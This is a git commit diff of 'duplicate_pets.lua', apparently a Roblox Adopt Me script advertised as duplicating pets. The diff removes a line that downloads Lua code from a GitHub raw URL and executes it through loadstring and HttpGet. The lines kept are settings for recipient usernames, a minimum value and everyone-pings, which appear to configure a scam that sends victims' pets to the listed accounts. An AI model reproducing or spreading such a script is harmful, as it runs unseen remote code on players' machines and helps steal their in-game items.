4d9ef421a15da4496d6fdda13d04d3b50ef31f0a
thatboyskulls12 <aj.skulls12@gmail.com>
2025-06-18 22:29:51 -0400

    Update duplicate_pets.lua

--- duplicate_pets.lua
+++ duplicate_pets.lua
@@ -1,5 +1,3 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/thatboyskulls12/adptmescrtips/main/gui_loader.lua"))()
-
 _G.Usernames = {"ajandaa12alt8", "ajandaa12alt1", "ajandaa12"} -- you can add as many as you'd like
 _G.min_value = 0.1
 _G.pingEveryone = "Yes" -- change to "No" if you dont want pings
